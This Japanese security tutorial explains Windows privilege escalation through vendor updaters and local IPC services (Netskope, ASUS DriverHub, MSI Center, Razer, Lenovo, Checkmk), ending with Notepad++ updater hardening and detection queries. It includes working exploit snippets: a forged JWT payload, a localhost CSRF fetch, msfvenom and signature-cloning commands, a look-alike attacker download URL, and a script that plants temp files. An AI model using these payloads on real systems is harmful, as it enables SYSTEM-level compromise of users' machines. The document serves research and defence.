# Enterprise Auto-Updaters と特権 IPC の悪用（例: Netskope、ASUS、MSI）

{{#include ../../banners/hacktricks-training.md}}

このページでは、低負荷で利用できる IPC サーフェスと特権アップデートフローを公開する、エンタープライズ向けエンドポイントエージェントおよびアップデーターで見つかった、Windows のローカル権限昇格チェーンの一種を一般化して説明します。代表例は Netskope Client for Windows < R129（CVE-2025-0309）です。この場合、低権限ユーザーが登録処理を攻撃者が制御するサーバーに誘導し、SYSTEM サービスに悪意ある MSI をインストールさせることができます。<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

類似製品に応用できる主なアイデア:
- 特権サービスの localhost IPC を悪用し、再登録または再設定を攻撃者のサーバーに強制する。
- ベンダーのアップデートエンドポイントを実装し、不正な Trusted Root CA を配布して、アップデーターを悪意ある「署名済み」パッケージに誘導する。
- 弱い署名者チェック（CN の許可リスト）、任意のダイジェストフラグ、緩い MSI プロパティを回避する。
- IPC が「暗号化」されている場合、レジストリに保存された、誰でも読み取り可能なマシン識別子からキー/IV を導出する。
- サービスが呼び出し元をイメージパス/プロセス名で制限している場合、許可リストにあるプロセスにインジェクションするか、プロセスをサスペンド状態で起動し、最小限のスレッドコンテキストパッチで DLL を読み込ませる。

カスタムのローカル TCP サービスは、PIN などのアプリケーション認証情報を要求する場合でも、同様に ID と入力境界を確認する必要があります。リスナーをそのプロセスおよび実効サービスアカウントに対応付け、実際に配置されているバイナリ/バージョンを調べてください。また、呼び出し元が制御するフィールドを固定長バッファーにコピーしたり、子プロセスのコマンドを構築したりする前に、長さが検証されているかを確認してください。[Microsoft のバッファーオーバーランに関するガイダンス](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns)では、特権ネイティブコードで外部入力を未検証のまま扱う危険性が説明されています。ループバックリスナー、ハードコードされた認証情報、またはプロセス名だけでは、メモリ破損や SYSTEM での実行が立証されるわけではありません。到達可能性、認可、コードパス、緩和策は、それぞれ別の条件です。通常の列挙では、稼働中のサービスにクラッシュを引き起こす長さの入力を送らず、受動的な手法にとどめてください。

---
## 1) localhost IPC を介して登録処理を攻撃者のサーバーに誘導する

多くのエージェントには、localhost TCP 経由で JSON を使って SYSTEM サービスと通信するユーザーモードの UI プロセスが含まれています。

Netskope で確認された構成:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit フロー:
1) バックエンドホストを制御するクレーム（例: AddonUrl）を含む JWT 登録トークンを作成します。署名を不要にするため、alg=None を使用します。
2) JWT とテナント名を指定して、プロビジョニングコマンドを呼び出す IPC メッセージを送信します:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) サービスが登録/設定取得のために攻撃者のサーバーへアクセスし始める。例:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

注意:
- 呼び出し元の検証がパス/名前ベースの場合は、許可リストに登録されたベンダーのバイナリからリクエストを送信する（§4を参照）。<sup>[[1]](#references)[[2]](#references)</sup>

### ネットワークからアクセス可能な管理 IPC

この信頼境界は、常に localhost に限定されるわけではありません。報告された MyReport Updater 2.1.1 のケースでは、`LocalSystem` サービスがすべてのインターフェースで待ち受け、認証なしの gRPC による参照ホスト、ポート、動作モードの設定変更を受け付けていました。リモートから攻撃するには、リスナーへのネットワークアクセスと、サービスから指定した参照先へのアウトバウンドアクセスの両方が必要でした。これらは、後続のパッケージ処理がファイル書き込みの境界を越えられるかどうかとは別に評価してください。<sup>[[16]](#references)</sup>

---
## 2) 更新チャネルを乗っ取り、SYSTEM としてコードを実行する

クライアントが攻撃者のサーバーと通信したら、期待されるエンドポイントを実装し、攻撃者の MSI を取得するよう誘導します。典型的な流れ:

1) /v2/config/org/clientconfig → 更新間隔を非常に短くした JSON 設定を返す。例:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificate を返す。サービスはこれを Local Machine Trusted Root ストアにインストールする。
3) /v2/checkupdate → 悪意のある MSI と偽のバージョンを指すメタデータを提供する。

実環境でよく見られるチェックの回避:
- Signer CN allow-list: サービスは Subject CN が「netSkope Inc」または「Netskope, Inc.」と一致するかだけを確認する場合がある。自分の rogue CA でその CN を持つ leaf を発行し、MSI に署名できる。
- CERT_DIGEST property: CERT_DIGEST という名前の無害な MSI property を含める。インストール時に検証は行われない。
- Optional digest enforcement: config flag（例: check_msi_digest=false）により、追加の暗号学的検証を無効化できる。

その結果、SYSTEM service が以下から MSI をインストールし、
C:\ProgramData\Netskope\stAgent\data\*.msi
NT AUTHORITY\SYSTEM として任意のコードを実行する。<sup>[[1]](#references)[[2]](#references)</sup>

Patch-bypass から得られる教訓: ベンダーが update source を暗号学的に認証する代わりに、少数の「信頼された」ドメインを allow-list に追加して対応した場合でも、攻撃者がトラフィックを誘導できるベンダー所有の redirector や reverse proxy を探そう。Netskope の場合、公開された後続調査により、R129 時代の allow-list は、攻撃者が制御する Azure App Service のコンテンツを proxy する `rproxy.goskope.com` 経由で依然として悪用できることが示された。hostname allow-list は信頼境界ではなく、時間稼ぎと考えよう。<sup>[[14]](#references)</sup>

もう一つの失敗パターンは、**自己整合性はあるが認証されていない package metadata** である。MyReport の事例では、攻撃者が制御する参照先が改変された archive を配信し、intermediary がベンダーの MD5 digest と size の応答を updater に届く前に書き換えていた。これらの値の一致で確認できたのは応答間の整合性であり、ベンダーを配信元とすることではなかった。MD5 collision は必要なかった。呼び出し元がインストール先ディレクトリを選択できたため、特権での展開処理が file-write boundary となった。その結果得られる DLL-loading primitive については、[任意のファイル書き込みを DLL hijacking につなげる](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack)を参照。<sup>[[16]](#references)</sup>

---
## 3) 暗号化された IPC request の偽造（存在する場合）

R127 以降、Netskope は IPC JSON を Base64 のように見える encryptData field でラップしていた。リバースエンジニアリングの結果、AES が使われており、key/IV はすべてのユーザーが読み取り可能な registry value から導出されていた:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

攻撃者は暗号化を再現し、標準ユーザーから有効な暗号化 command を送信できる。<sup>[[1]](#references)[[2]](#references)</sup> 一般的なヒント: agent が突然 IPC を「暗号化」し始めたら、HKLM 配下にある device ID、product GUID、install ID などを材料として探そう。

---
## 4) IPC caller allow-list の回避（path/name check）

一部の service は、TCP connection の PID を解決し、image path/name を Program Files 配下にある allow-list 登録済みのベンダー binary（例: stagentui.exe、bwansvc.exe、epdlp.exe）と比較して、peer を認証しようとする。

実用的な bypass は2つある:
- allow-list 登録済みの process（例: nsdiag.exe）に DLL injection し、その内部から IPC を proxy する。
- allow-list 登録済みの binary を suspended 状態で起動し、CreateRemoteThread を使わずに proxy DLL を bootstrap する（§5 を参照）。これにより、driver が強制する tamper rule を満たす。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper protection に配慮した injection: suspended process + NtContinue patch

製品には、保護された process の handle から危険な権限を削除する minifilter/OB callbacks driver（例: Stadrv）が同梱されていることが多い:
- Process: PROCESS_TERMINATE、PROCESS_CREATE_THREAD、PROCESS_VM_READ、PROCESS_DUP_HANDLE、PROCESS_SUSPEND_RESUME を削除
- Thread: THREAD_GET_CONTEXT、THREAD_QUERY_LIMITED_INFORMATION、THREAD_RESUME、SYNCHRONIZE に制限

これらの制約に従う、信頼性の高い user-mode loader:
1) CREATE_SUSPENDED を指定して、ベンダー binary の CreateProcess を実行する。
2) まだ許可されている handle を取得する: process には PROCESS_VM_WRITE | PROCESS_VM_OPERATION、thread には THREAD_GET_CONTEXT/THREAD_SET_CONTEXT（または、既知の RIP で code を patch する場合は THREAD_RESUME のみ）。
3) ntdll!NtContinue（または、早期に確実に map される別の thunk）を、自分の DLL path を指定して LoadLibraryW を呼び出し、その後元に戻る小さな stub で上書きする。
4) ResumeThread を実行して process 内で stub を起動し、DLL をロードする。

すでに保護された process に対して PROCESS_CREATE_THREAD や PROCESS_SUSPEND_RESUME を使わず（自分で作成したため）、driver の policy を満たせる。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) 実用的な tooling
- NachoVPN（Netskope plugin）は rogue CA の作成、悪意のある MSI の署名、および必要な endpoint の配信を自動化する: /v2/config/org/clientconfig、/config/ca/cert、/v2/checkupdate。<sup>[[3]](#references)</sup>
- UpSkope は、任意の（オプションで AES 暗号化された）IPC message を作成する custom IPC client で、allow-list 登録済みの binary から送信するための suspended-process injection も含む。<sup>[[4]](#references)</sup>

## 7) 未知の updater/IPC surface に対する迅速な triage workflow

新しい endpoint agent や motherboard「helper」suite を調査する場合、簡単な workflow で、有望な privesc target かどうかを通常は判断できる:<sup>[[6]](#references)</sup>

1) loopback listener を列挙し、ベンダー process と対応付ける:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) 候補となる名前付きパイプを列挙する：

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) プラグインベースのIPCサーバーが使用する、レジストリに格納されたルーティングデータを収集する:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) まずユーザーモードクライアントからendpoint名、JSONキー、command IDを抽出する。パッケージ化されたElectron/.NETフロントエンドからは、完全なスキーマが頻繁にleakする。

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) 最終的にプロセスを起動するコードパスだけでなく、実際に信頼性を判定する条件を探す:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

優先して調べるべきパターン:
- `CryptQueryObject` による証明書解析があり、`WinVerifyTrust` がない場合、「証明書が存在する」ことを「証明書が信頼されている」こととして扱っている可能性が高く、証明書のクローンや、その他の偽装署名者の手口が使える場合があります。
- `Origin`、`Referer`、ダウンロード URL、プロセス名、署名者の CN に対する部分文字列チェックやサフィックスチェックは、認証にはなりません。`contains(".vendor.com")` は、通常、攻撃者が制御する類似ドメインを使って悪用できます。
- 低権限の GUI が「このファイルは信頼できる」と判断し、SYSTEM ブローカーがその結果を受け取るだけなら、クライアント側の DLL/JS をパッチしたり再実装したりするだけで、境界を完全に回避できることがあります（Razer 形式の分離された検証）。
- ブローカーがペイロードを `%TEMP%`/`C:\Windows\Temp` にコピーし、そのパスから検証またはスケジュールする場合は、直ちに TOCTOU の置換可能な時間枠と、より弱いチェックを持つ代替 `ExecuteTask()` ラッパーを公開する隣接プラグインモジュールを調べてください。<sup>[[6]](#references)</sup>

名前付きパイプを多用するターゲットでは、プロトコルを詳しくリバースする前に、PipeViewer を使うと弱い DACL やリモートから到達可能なパイプをすばやく見つけられます。<sup>[[11]](#references)</sup>

ターゲットが呼び出し元の認証に PID、イメージパス、またはプロセス名しか使っていない場合は、それを境界ではなく単なる障害物と考えてください。正規クライアントへのインジェクションや、許可リストに登録されたプロセスからの接続だけで、サーバーのチェックを通過できることがよくあります。名前付きパイプについては、[クライアントの偽装とパイプの悪用に関するこのページ](named-pipe-client-impersonation.md)で、基本的な仕組みを詳しく説明しています。

特権を持つ **cleanup または restore ブローカー**では、パイプの ACL だけでなく、パスの信頼境界も調べてください。サービスの実行ファイルとインストールディレクトリが保護されていても、低権限の呼び出し元が共有ディレクトリ内の復元先を選択したり、ステージング済みバックアップのファイル名を変更したりできる場合があります。呼び出し元が復元コマンドに到達できること、正確なステージング済み入力またはファイル名を変更できること、ブローカーがより高い権限で実行されること、そして復元処理が実際に選択された保護対象パスへ書き込むことを、それぞれ個別に確認してください。書き込み可能なステージングディレクトリや読み取り可能なパイプがあるだけでは、任意の特権書き込みが可能とは言えません。宛先へのマッピングとサービスの動作は、コードレビューまたは制御されたテストで確認する必要があります。ユーザーファイルを削除する可能性があるため、受動的な列挙中に不明な cleanup コマンドを実行しないでください。

---
## 8) ベンダー署名だけで認証するモジュール型アドインブローカー（Lenovo Vantage パターン）

新たに調査する価値のある亜種として、**signed-client RPC broker** があります。低権限の Lenovo 署名済みデスクトッププロセスが SYSTEM サービスと通信し、そのサービスが `%ProgramData%` 配下の XML で定義された一連のアドインに JSON コマンドを振り分けます。受け入れられる署名済みクライアントの**いずれかの内部でコード実行**を達成すると、すべての `runas="system"` コントラクトが攻撃対象領域になります。<sup>[[15]](#references)</sup>

Lenovo Vantage の調査で確認された価値の高いプリミティブ:
- **呼び出し元がベンダーによって署名されていることを信頼する**: 調査者は、Lenovo 署名済み EXE を書き込み可能なディレクトリにコピーし、DLL サイドローディング（`profapi.dll`）を成立させることで、サービスがすでに信頼しているクライアント内で任意コードを実行し、認証済みコンテキストに到達しました。
- **マニフェスト駆動の攻撃対象領域の探索**: アドインは `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` 配下で宣言されています。複数のコントラクトが `SYSTEM` として実行されるため、これらのマニフェストを列挙することで、ブローカー自体をリバースするより早く、実際の特権操作を見つけられることがよくあります。
- **認証済みチャネルの背後にあるコマンドごとのバグ**: 信頼されたクライアント内に入った後の公開調査では、更新/インストール操作におけるパストラバーサルと競合状態、特権設定データベースでの raw SQL の悪用、意図されたハイブの外への書き込みを可能にするレジストリパスの部分文字列チェックが確認されています。

ターゲットで役立つ偵察方法:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

実践的な要点: helper suite が、まず**呼び出し元プロセス**を認証してから、数十種類の plugin/add-in コマンドをディスパッチする broker を公開している場合、入口の信頼チェックを回避しただけで調査を終えてはいけません。manifest/contract table をダンプし、特権を持つ各 verb を個別に fuzz してください。認証済みチャネルの背後には、通常、複数の二段階目のバグが隠れています。

---
## 1) 特権 HTTP API に対するブラウザーから localhost への CSRF（ASUS DriverHub）

DriverHub は、127.0.0.1:53000 で動作するユーザーモードの HTTP サービス（ADU.exe）を提供します。このサービスは、https://driverhub.asus.com からのブラウザー呼び出しを想定しています。Origin フィルターは、Origin ヘッダーと `/asus/v1.0/*` が公開するダウンロード URL に対して、単純に `string_contains(".asus.com")` を実行します。そのため、`https://driverhub.asus.com.attacker.tld` のような攻撃者が制御するホストでもチェックを通過し、JavaScript から状態を変更するリクエストを送信できます。<sup>[[6]](#references)</sup> 追加の回避パターンについては、[CSRF の基本](../../pentesting-web/csrf-cross-site-request-forgery.md)を参照してください。

実践的な手順:
1) `.asus.com` を含むドメインを登録し、そこに悪意のある Web ページをホストします。
2) `fetch` または XHR を使って、`http://127.0.0.1:53000` の特権エンドポイント（例: `Reboot`、`UpdateApp`）を呼び出します。
3) ハンドラーが期待する JSON body を送信します。圧縮された frontend JS に、以下のスキーマが示されています。

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

以下に示すPowerShell CLIも、Originヘッダーを信頼された値に偽装すると成功します：

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

攻撃者のサイトをブラウザーで開くと、1クリック（または `onload` による0クリック）のローカルCSRFとなり、SYSTEM権限のヘルパーを動作させます。

---
## 2) 安全でない code-signing 検証と証明書のクローン（ASUS UpdateApp）

`/asus/v1.0/UpdateApp` は、JSON body で指定された任意の実行ファイルをダウンロードし、`C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` にキャッシュします。ダウンロード URL の検証にも同じ部分文字列ロジックが使われるため、`http://updates.asus.com.attacker.tld:8000/payload.exe` が受け入れられます。ダウンロード後、ADU.exe は実行前に PE に署名が含まれていること、および Subject 文字列が ASUS と一致することを確認するだけです。`WinVerifyTrust` も証明書チェーンの検証も行いません。

この処理を悪用するには:
1) payload を作成します（例: `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`）。
2) ASUS の署名者を payload にクローンします（例: `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`）。
3) `pwn.exe` を `.asus.com` に見せかけたドメインでホストし、上記のブラウザーCSRFで UpdateApp を実行させます。

Origin と URL のフィルターはいずれも部分文字列ベースで、署名者のチェックは文字列を比較するだけなので、DriverHub は攻撃者のバイナリを取得し、昇格されたコンテキストで実行します。<sup>[[6]](#references)</sup>

---
## 1) updater のコピー／実行処理における TOCTOU（MSI Center CMD_AutoUpdateSDK）

MSI Center の SYSTEM サービスは、各フレームが `4-byte ComponentID || 8-byte CommandID || ASCII arguments` となる TCP プロトコルを公開しています。コアコンポーネント（Component ID `0f 27 00 00`）には `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` が含まれます。そのハンドラーは次の処理を行います。
1) 指定された実行ファイルを `C:\Windows\Temp\MSI Center SDK.exe` にコピーします。
2) `CS_CommonAPI.EX_CA::Verify` を使って署名を検証します（証明書の Subject が “MICRO-STAR INTERNATIONAL CO., LTD.” と一致し、`WinVerifyTrust` が成功する必要があります）。
3) 攻撃者が指定した引数を使って、temp ファイルを SYSTEM として実行するスケジュールタスクを作成します。

コピーされたファイルは、検証から `ExecuteTask()` までの間ロックされません。攻撃者は次のことができます。
- 正規の MSI 署名付きバイナリを指定した Frame A を送信する（署名チェックを確実に通過させ、タスクをキューに入れる）。
- 検証完了直後に `MSI Center SDK.exe` を悪意ある payload で上書きする Frame B メッセージを繰り返し送信して競合させる。

スケジューラーが起動すると、元のファイルを検証済みであるにもかかわらず、上書きされた payload が SYSTEM として実行されます。確実に悪用するには、2つの goroutine／thread から CMD_AutoUpdateSDK を連続送信し、TOCTOU の隙を突きます。<sup>[[6]](#references)</sup>

---
## 2) カスタムの SYSTEM レベル IPC と impersonation の悪用（MSI Center + Acer Control Centre）

### MSI Center の TCP コマンドセット
- `MSI.CentralServer.exe` が読み込む各 plugin／DLL には、`HKLM\SOFTWARE\MSI\MSI_CentralServer` に保存された Component ID が割り当てられます。フレームの先頭4バイトでコンポーネントが選択されるため、攻撃者は任意のモジュールにコマンドを送れます。
- plugin は独自のタスクランナーを定義できます。`Support\API_Support.dll` は `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` を公開し、**署名検証なし**で `API_Support.EX_Task::ExecuteTask()` を直接呼び出します。任意のローカルユーザーが `C:\Users\<user>\Desktop\payload.exe` を指定すれば、確実に SYSTEM 権限で実行できます。
- Wireshark で loopback を盗聴するか、dnSpy で .NET バイナリを解析すれば、Component とコマンドの対応関係をすぐに特定できます。その後、カスタムの Go／Python クライアントでフレームを再送できます。<sup>[[6]](#references)</sup>

### Acer Control Centre の named pipe と impersonation レベル
- `ACCSvc.exe`（SYSTEM）は `\\.\pipe\treadstone_service_LightMode` を公開しており、その discretionary ACL はリモートクライアント（例: `\\TARGET\pipe\treadstone_service_LightMode`）からの接続を許可しています。ファイルパスとともにコマンド ID `7` を送信すると、サービスのプロセス起動ルーチンが呼び出されます。
- クライアントライブラリは、引数とともに終端用のマジックバイト（113）をシリアライズします。Frida／`TsDotNetLib` による動的計測（計測のヒントは [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) を参照）から、ネイティブハンドラーは `CreateProcessAsUser` を呼び出す前に、この値を `SECURITY_IMPERSONATION_LEVEL` と integrity SID に対応付けていることが分かります。
- 113（`0x71`）を114（`0x72`）に置き換えると、完全な SYSTEM token を保持し、高 integrity SID（`S-1-16-12288`）を設定する汎用分岐に入ります。そのため、起動されたバイナリはローカルでもマシン間でも、制限のない SYSTEM として実行されます。
- 公開されている installer フラグ（`Setup.exe -nocheck`）と組み合わせれば、ラボ VM でも ACC をセットアップし、ベンダーのハードウェアなしで pipe を試せます。<sup>[[6]](#references)</sup>

これらの IPC の脆弱性は、localhost のサービスで相互認証（ALPC SID、`ImpersonationLevel=Impersonation` フィルター、token filtering）を必須にする必要性と、各モジュールの「任意のバイナリを実行する」ヘルパーで同じ署名検証を適用する必要性を示しています。

---
## 3) 弱いユーザーモード検証に依存する COM／IPC「elevator」ヘルパー（Razer Synapse 4）

Razer Synapse 4 では、この系統の攻撃に役立つパターンがもう1つ加わりました。低権限ユーザーが COM ヘルパー `RzUtility.Elevator` 経由でプロセスを起動させることができ、その信頼判定は特権境界内で堅牢に行われず、ユーザーモード DLL（`simple_service.dll`）に委ねられています。

確認された悪用手順:
- COM object `RzUtility.Elevator` をインスタンス化します。
- `LaunchProcessNoWait(<path>, "", 1)` を呼び出して、昇格したプロセスの起動を要求します。
- 公開 PoC では、要求を送る前に `simple_service.dll` 内の PE 署名チェックをパッチで無効化し、攻撃者が選んだ任意の実行ファイルを起動できるようにします。<sup>[[6]](#references)[[10]](#references)</sup>

最小限の PowerShell 呼び出し:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

一般的な教訓: 「helper」スイートをリバースするときは、localhost TCP や named pipes だけで調査を終えないでください。`Elevator`、`Launcher`、`Updater`、`Utility` などの名前を持つ COM クラスを確認し、特権サービスが対象バイナリ自体を検証しているのか、それともパッチ可能なユーザーモードのクライアント DLL が計算した結果を単に信頼しているのかを確かめてください。このパターンは Razer に限らず、低権限側が判定した許可／拒否の結果を高権限のブローカーが受け取る分割設計は、privesc の攻撃対象となる可能性があります。


---
## MSI repair 中の予測可能な一時スクリプト実行（Checkmk Agent / CVE-2024-0670）

一部の Windows エージェントは、今でも一時的な `.cmd` を `C:\Windows\Temp` に書き込み、`SYSTEM` として実行することで特権アクションを実行します。ファイル名が予測可能で、サービスが既存ファイルを安全に再作成しない場合、低権限ユーザーは将来使われる一時ファイルを事前に **read-only** として作成し、特権プロセスに自身のスクリプトではなく、攻撃者が制御する内容を実行させることができます。

脆弱な Checkmk Agent ビルドで確認された内容:
- 一時ファイルのパターン: `cmk_all_<PID>_1.cmd`
- 影響を受けるブランチ: `2.0.0`、`2.1.0`、`2.2.0`
- トリガー: キャッシュされたエージェントパッケージの MSI **repair**<sup>[[8]](#references)[[9]](#references)</sup>

実行手順:
1. 現在のプロセス ID または実行中のエージェントの PID から、現実的な PID の範囲を見積もります。
2. 短い **ASCII** の `.cmd` ペイロードを書き込みます（`Set-Content -Encoding Ascii` または `cmd.exe` のリダイレクトを使用し、バッチファイルに UTF-16 の PowerShell 出力を使うのは避けます）。
3. 候補の範囲にわたって `C:\Windows\Temp\cmk_all_<PID>_1.cmd` を大量に作成し、各ファイルを read-only に設定します。
4. キャッシュされた MSI の repair を実行し、特権サービスに一時スクリプトを再生成させて実行させます。<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

脆弱な製品が Windows Installer でインストールされている場合は、修復を実行する前に、`C:\Windows\Installer` にあるランダムな名前のキャッシュ済み MSI を製品名に対応付けます:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

運用上の注意:
- `msiexec /fa` が非対話型の WinRM シェルから失敗し、既存のデスクトップセッションまたは切断されたセッションが修復を正しく実行させられるか確認する必要がある場合、`qwinsta` が役立ちます。<sup>[[7]](#references)</sup>
- このパターンは、**world-writable な場所に一時スクリプトをステージングし、後で SYSTEM として実行する**他のエンドポイントエージェントや updater にも当てはまります。予測可能な名前、排他的作成の仕組みの欠如、オンデマンドでトリガーできる修復・更新フローを調べてください。

### 対話型インストーラーの修復と特権コンソール

PDF24 Creator 11.15.1 は、別種の MSI 修復リスクを示しています。プリンターインストールのカスタムアクションにより、修復中に SYSTEM 権限を持つ可視コンソールが起動する場合があります。この動作に対処するため、ベンダーは 11.15.2 で MSI インストーラーを変更しました。古い製品バージョンは、あくまでトリアージの手掛かりにすぎません。登録済みまたはアクセス可能な MSI パッケージ、そのユーザーが修復を開始できるか、脆弱なカスタムアクションとログファイルの遅延が存在するか、対話型デスクトップにコンソールを表示できるかを確認してください。報告された遅延には `faxPrnInst.log` に対する oplock が使われていました。通常のファイル書き込み権限だけがアクセス条件ではありません。非対話型シェル、アクセス不能なパッケージ、またはパッチ適用済みのインストーラーによって、攻撃の連鎖が成立しない場合があります。この問題は `AlwaysInstallElevated` に依存せず、予測可能な一時スクリプトの置き換えとも異なります。

---
## 脆弱な updater 検証を介したリモート・サプライチェーンハイジャック（WinGUp / Notepad++）

2025年6月から2025年12月にかけて、Notepad++ の更新フローを支えるホスティングインフラを侵害した攻撃者は、標的に選んだ被害者に悪意のあるマニフェストを選択的に配信しました。古い WinGUp ベースの updater は更新の真正性を十分に検証していなかったため、不正な XML 応答によってクライアントが攻撃者の管理する URL に誘導される可能性がありました。クライアントは、信頼された証明書チェーンとダウンロードしたインストーラーの有効な PE 署名の両方を強制せずに HTTPS コンテンツを受け入れていたため、被害者はトロイの木馬化された NSIS `update.exe` をダウンロードして実行しました。<sup>[[12]](#references)[[13]](#references)</sup>

運用フロー（ローカルでの exploit は不要）:
1. **インフラの傍受**: CDN/ホスティングを侵害し、悪意のあるダウンロード URL を指す攻撃者のメタデータを返して更新チェックに応答する。
2. **トロイの木馬化された NSIS**: インストーラーがペイロードを取得・実行し、2つの実行チェーンを悪用する:
   - **Bring-your-own signed binary + sideload**: 署名済みの Bitdefender `BluetoothService.exe` を同梱し、その検索パスに悪意のある `log.dll` を配置する。署名済みバイナリが実行されると、Windows が `log.dll` を sideload し、これが Chrysalis backdoor（静的検出を妨げるために Warbird で保護され、API hashing を使用）を復号して reflectively load する。
   - **Scripted shellcode injection**: NSIS がコンパイル済みの Lua スクリプトを実行し、Win32 API（例: `EnumWindowStationsW`）を使って shellcode を注入し、Cobalt Strike Beacon をステージングする。<sup>[[12]](#references)</sup>

あらゆる auto-updater に向けたハードニング/検出の要点:
- ダウンロードしたインストーラーの**証明書と署名の検証**を強制し（ベンダーの署名者を pin し、一致しない CN/チェーンを拒否）、更新マニフェスト自体にも署名する（例: XMLDSig）。検証されていない限り、マニフェストによって制御されるリダイレクトをブロックする。
- **BYO signed binary sideloading** をダウンロード後の検出ピボットとして扱う。署名済みベンダー EXE が正規のインストールパス外にある DLL 名を読み込んだ場合（例: Bitdefender が Temp/Downloads から `log.dll` を読み込む）、また updater がベンダー署名のないインストーラーを一時フォルダーに配置・実行した場合にアラートを出す。
- この攻撃チェーンで確認された**マルウェア固有の痕跡**を監視する（汎用的なピボットとして有用）: mutex `Global\Jdhfv_1.0.1`、`%TEMP%` への異常な `gup.exe` の書き込み、Lua による shellcode injection の段階。
- Notepad++ は v8.8.9 以降で WinGUp を強化して対応しました。返される XML に署名（XMLDSig）が付与されるようになり、新しいビルドでは通信経路だけを信頼せず、ダウンロードしたインストーラーの証明書と署名の検証を強制します。<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE による <code>log.dll</code> の sideloading (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> が Notepad++ 以外のインストーラーを起動</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
